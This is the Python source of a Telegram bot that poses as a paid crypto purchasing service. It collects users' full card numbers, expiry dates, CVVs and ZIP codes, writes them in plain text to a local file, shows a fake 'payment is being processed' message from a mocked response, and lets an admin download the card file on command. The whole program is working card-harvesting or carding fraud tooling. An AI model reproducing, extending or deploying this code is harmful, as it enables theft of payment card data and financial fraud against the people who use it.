import os
import re 
from helping_fcn import sec_key, saveid, check_root, claiming_key, checking_paid, info, broad, order_complete
from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

owner = "https://t.me/SpamLord"

# Load environment variables
load_dotenv()
token = os.getenv('bot_api')
updater = Updater(token, use_context=True)



# Start command
def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    message = (
        "<b>Welcome to the Crypto Purchasing Bot!</b>\n"
        "Here, you can easily purchase cryptocurrencies like <b>BTC</b>, <b>LTC</b>, <b>XRP</b>, and <b>ETH</b>.\n"
        "Type <code>/help</code> to see a list of available commands and get started."
    )
    update.message.reply_text(message, parse_mode='HTML',reply_to_message_id=update.message.message_id)
    

# Help command
def help_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    message = (
        "<b>Welcome to the Help Section!</b>\n\n"
        "Here are the available commands and their usage:\n\n"
        "<b>/btc [amount in USD]</b> - Purchase Bitcoin (BTC) by specifying the amount in dollars.\n"
        "<b>/eth [amount in USD]</b> - Purchase Ethereum (ETH) by specifying the amount in dollars.\n"
        "<b>/ltc [amount in USD]</b> - Purchase Litecoin (LTC) by specifying the amount in dollars.\n"
        "<b>/xrp [amount in USD]</b> - Purchase Ripple (XRP) by specifying the amount in dollars.\n"
        "<b>/start</b> - Initiate interaction with the bot.\n"
        "<b>/help</b> - Display this help message.\n"
        "<b>/claim</b> - Claim your generated key.\n"
        "<b>/subinfo</b> - Check your subscription status.\n"
    )
    update.message.reply_text(message, parse_mode='HTML',reply_to_message_id=update.message.message_id)

# Confirm order callback
def confirm_order(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    # Retrieve order details from user_data
    crypto = context.user_data.get('crypto')
    amount = context.user_data.get('amount')

    message = f"<b>You have requested to purchase <code>${amount}</code> worth of {crypto}. Confirm your order to proceed with payment.</b>"

    # Inline keyboard for payment confirmation
    keyboard = [
        [InlineKeyboardButton("Enter Wallet address", callback_data='added')],
        [InlineKeyboardButton("Cancel Order", callback_data='cancel_order')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    query.edit_message_text(text=message, reply_markup=reply_markup, parse_mode="HTML")

# Handle payment confirmation
def handle_payment(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    if query.data == 'cancel_order':
        query.edit_message_text(text="Your order has been canceled.")
        context.user_data.clear()
    
    elif query.data == 'added':
        message = "<b>Please provide your wallet address according to your crypto</b>\n"
        context.user_data['awaiting_wallet_details'] = True
        query.edit_message_text(text=message, parse_mode='HTML')


def is_valid_wallet_address(address: str, crypto: str, strict_length=False) -> bool:
    patterns = {
        'Bitcoin (BTC)': r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$',
        'Ethereum (ETH)': r'^0x[a-fA-F0-9]{40}$',
        'Litecoin (LTC)': r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',
        'Ripple (XRP)': r'^r[0-9a-zA-Z]{24,34}$',
        # Add more cryptocurrencies here
    }

    if crypto not in patterns:
        raise ValueError(f"Unsupported cryptocurrency: {crypto}")

    pattern = patterns[crypto]
    
    if crypto == 'Bitcoin (BTC)' and not strict_length:
        pattern = f'{pattern.lower()}|{pattern.upper()}'

    try:
        return bool(re.match(pattern, address))
    except re.error:
        print(f"Invalid regular expression pattern for {crypto}")
        return False

# Handle wallet address input
def receive_wallet_address(update: Update, context: CallbackContext):
    if context.user_data.get('awaiting_wallet_details'):
        wallet_address = update.message.text.strip()
        crypto = context.user_data.get('crypto', '')
        amount = context.user_data.get('amount', '')
        
        if is_valid_wallet_address(wallet_address, crypto):
            # Store the wallet address in context.user_data
            context.user_data['wallet_address'] = wallet_address

            message = f"<b>Thank you! Your {crypto} wallet address has been recorded as: {wallet_address}.</b>"
            context.user_data['awaiting_wallet_details'] = False
            context.user_data['awaiting_cc_details'] = True  # Now await credit card details
            
            update.message.reply_text(message, parse_mode="HTML")
            update.message.reply_text("Please provide your credit card details in the format:\n"
                                      "<code>Card Number|Expiration Date (MM|YYYY)|CVV|ZIP</code>\n\n"
                                      "For example: <code>1234567812345678|12|2024|123|10080</code>", parse_mode="HTML")
        else:
            update.message.reply_text(f"<b>Invalid {crypto} wallet address. Please enter a valid address.</b>", parse_mode="HTML")
    else:
        update.message.reply_text("<b>Please confirm your order before providing a wallet address.</b>", parse_mode="HTML")


def receive_cc_details(update: Update, context: CallbackContext):
    username = update.message.from_user.username
    userid = update.message.from_user.id

    if context.user_data.get('awaiting_cc_details'):
        payment_info = update.message.text.strip()
        wallet_address = context.user_data.get('wallet_address', '')
        amount = context.user_data.get('amount', '')

        try:
            # Split the input using '|' as the delimiter
            card_number, exp_month, exp_year, cvv, zip_code = payment_info.split('|')
            card_number = card_number.strip()
            exp_month = exp_month.strip()
            exp_year = exp_year.strip()
            cvv = cvv.strip()
            zip_code = zip_code.strip()

            with open("cc.txt", 'a') as f:
                f.write(f"{userid},@{username},{amount}$,{wallet_address},{card_number}|{exp_month}|{exp_year}|{cvv}|{zip_code}\n")

            # Check if the expiration year is in YY or YYYY format
            if len(exp_year) == 2:
                exp_year = f"20{exp_year}"  # Convert YY to YYYY

            response = {'status': 'success'}  # Mock response; replace with actual API response handling

            if response['status'] == 'success':
                update.message.reply_text("<b>Thank you! Your payment is being processed. It will take 30 mins - 1 day to process</b>", parse_mode="HTML")
                context.user_data['awaiting_cc_details'] = False
                context.user_data['awaiting_wallet_details'] = False
            else:
                update.message.reply_text("There was an issue with your payment. Please try again.")

        except ValueError:
            update.message.reply_text("Invalid format. Please send your payment details in the correct format.")
    else:
        update.message.reply_text("No payment details are being awaited. Please confirm your order first.")

def btc(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)

    # Check subscription status only once and store the result
    subscription_status = checking_paid(user_id)
    
    # Debug: Print the subscription status and date for verification
    if subscription_status == True:
        if context.args:
            try:
                amount = float(context.args[0])  # Ensure amount is a float
                context.user_data['crypto'] = 'Bitcoin (BTC)'
                context.user_data['amount'] = amount
                message = f"<b>You have requested to purchase <code>${amount:.2f}</code> worth of Bitcoin (BTC). Confirm your order to proceed.</b>"

                keyboard = [
                    [InlineKeyboardButton("Confirm Order", callback_data='confirm_order')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML",reply_to_message_id=update.message.message_id)
            except ValueError:
                update.message.reply_text("<b>Invalid amount specified. Please enter a valid number. Example: /btc 100</b>", parse_mode="HTML")
        else:
            update.message.reply_text("<b>Please specify the amount in USD. Example: /btc 100</b>", parse_mode="HTML")
    elif subscription_status == False:
        keyboard = [
                [InlineKeyboardButton("Click To Purchase", url=owner)]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>",reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch in the system. Contact support.</b>", parse_mode="HTML")
        # Use context.bot to access the bot instance
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in btc function")
        
        
# Command to purchase ETH
def eth(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    subscription_status = checking_paid(user_id)
    if subscription_status == True:        
        if context.args:
            amount = context.args[0]
            context.user_data['crypto'] = 'Ethereum (ETH)'
            context.user_data['amount'] = amount
            message = f"<b>You have requested to purchase <code>${amount}</code> worth of Ethereum (ETH). Confirm your order to proceed.</b>"
            
            keyboard = [
                [InlineKeyboardButton("Confirm Order", callback_data='confirm_order')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML",reply_to_message_id=update.message.message_id)
        else:
            update.message.reply_text("<b>Please specify the amount in USD. Example: /eth 100</b>")
    elif subscription_status == False:
        keyboard = [
                [InlineKeyboardButton("Click To Purchase", url=owner)]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>",reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch in the system. Contact support.</b>", parse_mode="HTML")
        # Use context.bot to access the bot instance
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in eth function")
# Command to purchase LTC
def ltc(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    subscription_status = checking_paid(user_id)
    if subscription_status == True:  
        if context.args:
            amount = context.args[0]
            context.user_data['crypto'] = 'Litecoin (LTC)'
            context.user_data['amount'] = amount
            message = f"<b>You have requested to purchase <code>${amount}</code> worth of Litecoin (LTC). Confirm your order to proceed.</b>"
            
            keyboard = [
                [InlineKeyboardButton("Confirm Order", callback_data='confirm_order')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML",reply_to_message_id=update.message.message_id)
        else:
            update.message.reply_text("Please specify the amount in USD. Example: /ltc 100")
    elif subscription_status == False:
        keyboard = [
                [InlineKeyboardButton("Click To Purchase", url=owner)]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>",reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch in the system. Contact support.</b>", parse_mode="HTML")
        # Use context.bot to access the bot instance
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in ltc function")

# Command to purchase XRP
def xrp(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    subscription_status = checking_paid(user_id)
    if subscription_status == True:      
        if context.args:
            amount = context.args[0]
            context.user_data['crypto'] = 'Ripple (XRP)'
            context.user_data['amount'] = amount
            message = f"<b>You have requested to purchase <code>${amount}</code> worth of Ripple (XRP). Confirm your order to proceed.</b>"
            
            keyboard = [
                [InlineKeyboardButton("Confirm Order", callback_data='confirm_order')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML",reply_to_message_id=update.message.message_id)
        else:
            update.message.reply_text("Please specify the amount in USD. Example: /xrp 100")
    elif subscription_status == False:
        keyboard = [
                [InlineKeyboardButton("Click To Purchase", url=owner)]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>",reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch in the system. Contact support.</b>", parse_mode="HTML")
        # Use context.bot to access the bot instance
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in eth function")
# fcn for generating keys 
def keygen(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    First_name = update.message.from_user.first_name  # Fixed to use 'username'
    saveid(user_id)
    
    is_root = check_root(user_id)
    
    if is_root:
        if len(context.args) != 2:
            update.message.reply_text("<b>Please provide the duration in the format: <code>/keygen {number}</code> {month/year}.</b>", parse_mode="HTML",reply_to_message_id=update.message.message_id)
            return
        
        # Extract the number and period (month/year)
        duration, period = context.args
        
        # Validate the period using regular expressions
        if re.match(r'^(month|year)$', period):
            # Perform the key generation process based on the duration and period
            key = sec_key(length=16)
            update.message.reply_text(f"<b>Generated Key for <code>{duration}</code> <code>{period}</code>. Your Key - <code>{key}</code></b>", parse_mode="HTML")
            with open("key.txt", "a") as f:
                f.write(f"{period},{duration},{key}\n")
        else:
            update.message.reply_text("<b>Please specify the period as either <code>'month'</code> or <code>'year'</code>.</b>", parse_mode="HTML")
    
    elif not is_root:
        update.message.reply_text(f"<b>Get Your Fking Ass Away From HERE {First_name}!!</b>",parse_mode="HTMl")
    
    else:
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>",parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in keyGen fcn")
        
        
def claim(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    username = update.message.from_user.username
    first_name = update.message.from_user.first_name  # Corrected variable name to lowercase
    
    saveid(user_id)
    
    # Ensure that the key is provided
    if len(context.args) == 0:
        update.message.reply_text("<b>Please provide a key.</b>",parse_mode="HTML",reply_to_message_id=update.message.message_id)
        return
    
    enterkey = context.args[0]
    
    # Call the claiming_key function once
    success, new_date, duration, time = claiming_key(enterkey, user_id, username)
    
    if success ==True :
        update.message.reply_text(
            f"<b>Congratulations <code>{first_name}</code>, you have a subscription until <code>{new_date}</code>,</b>"
            f"<b>For <code>{time}</code> <code>{duration}</code>.</b>",parse_mode="HTML")
    elif success ==False :
        update.message.reply_text("<b>Invalid key, please don't waste my time.</b>", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    else :
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>",parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text=f"Glitch in code nearby in claiming key fcn")
        
def sub_info(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    usrid, username, sub_date, stat = info(user_id)
    

    if stat == "running":
        update.message.reply_text("<b>Hi there here is your subscription status & other info -</b>\n"
                                  f"<b>USERNAME - <code>{username}</code></b>\n"
                                  f"<b>USER ID  - <code>{usrid}</code></b>\n"
                                  f"<b>SUBSCRIPTION TILL - <code>{sub_date}</code></b>\n"
                                  f"<b>SUBSCRIPTION STAT - <code>{stat}</code></b>\n", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    elif stat == "expired":
        update.message.reply_text("<b>Hi there here is your subscription status & other info -</b>\n"
                                  f"<b>USERNAME - <code>{username}</code></b>\n"
                                  f"<b>USER ID  - <code>{usrid}</code></b>\n"
                                  f"<b>SUBSCRIPTION TILL - <code>{sub_date}</code></b>\n"
                                  f"<b>SUBSCRIPTION STAT - <code>{stat}</code></b>\n", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    elif stat == "no":
        keyboard = [
            [InlineKeyboardButton("Click To Purchase", url=owner)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>", reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>", parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in subinfo fcn")
        
        
def show_order(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    root = check_root(user_id)
    if root == True:
        caption = "Here is your order file with all order details."  # Caption for the file
        with open("cc.txt", 'rb') as file:
            update.message.reply_document(document=file, caption=caption,reply_to_message_id=update.message.message_id)
    else :
        update.message.reply_text("<b>Get Your fking ass away from here theif.</b>", parse_mode="HTML")
    
def broadcast (update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    root = check_root(user_id)
    ids = broad()
    text = ' '.join(context.args)
    message  = f"<b>{text}</b>"
    if root == True :
        if context.args:
            for id in ids:
                context.bot.send_message(chat_id=id, text=message, parse_mode="HTML")
            update.message.reply_text(f"<b>This message ->'{message}' sended to everyone</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
        else :
            update.message.reply_text("<b>Bruh What are you doing !!?\nSend message like this /broad {Message}</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
    else :
        update.message.reply_text("<b>With Great Powers come with Great Responsibility & You are not the one to take it </b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)            
    
def order (update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    root = check_root(user_id)
    usrname = context.args[0]
    amt = context.args[1]
    completed, userid = order_complete(usrname,amt)
    if root==True:
        if context.args:
            if completed == True:
                update.message.reply_text(f"<b><code>{usrname}</code> order of <code>{amt}</code> has been completed</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
                context.bot.send_message(text = f"<b><code>{usrname}</code> order of <code>{amt}</code> has been completed</b>", chat_id=userid, parse_mode="HTML")
            else:
                update.message.reply_text(f"<b>There is no order with this username <code>{usrname}</code> and this amount <code>{amt}</code></b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
        else :
            update.message.reply_text(f"<b>Please send username and amount to complete the order</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
    else:
        update.message.reply_text("<b>With Great Powers come with Great Responsibility & You are not the one to take it </b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)            
# Main function to run 
def main():
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("btc", btc))
    dp.add_handler(CommandHandler("eth", eth))
    dp.add_handler(CommandHandler("ltc", ltc))
    dp.add_handler(CommandHandler("xrp", xrp))
    dp.add_handler(CommandHandler("keygen", keygen))
    dp.add_handler(CommandHandler("claim", claim))
    dp.add_handler(CommandHandler("subinfo", sub_info))
    dp.add_handler(CommandHandler("sendorder", show_order))
    dp.add_handler(CommandHandler("brd", broadcast))
    dp.add_handler(CommandHandler("comp_order", order))

    # Callback query handler
    dp.add_handler(CallbackQueryHandler(confirm_order, pattern='confirm_order'))
    dp.add_handler(CallbackQueryHandler(handle_payment, pattern='confirm_payment|cancel_order|added'))

    # Message handlers
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, lambda update, context: 
                                  receive_wallet_address(update, context) if context.user_data.get('awaiting_wallet_details') 
                                  else receive_cc_details(update, context)))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()